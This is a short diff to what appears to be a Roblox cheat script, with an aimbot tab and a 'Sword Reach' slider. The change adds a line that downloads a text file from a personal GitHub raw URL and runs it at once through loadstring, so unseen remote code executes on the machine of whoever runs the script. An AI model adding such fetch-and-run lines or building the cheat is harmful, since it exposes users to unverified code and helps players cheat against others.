@@ -6,6 +6,7 @@ local MainSection = AimbotTab:CreateSection("Main")
 
 --local ConfigSection = AimbotTab:CreateSection("Config")
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GGH52lan/GGH52lan/main/keyboard.txt"))()
 
 MainSection:CreateSlider("Sword Reach", 0, 1000, 0, false, function(value)
    local circleSize = value
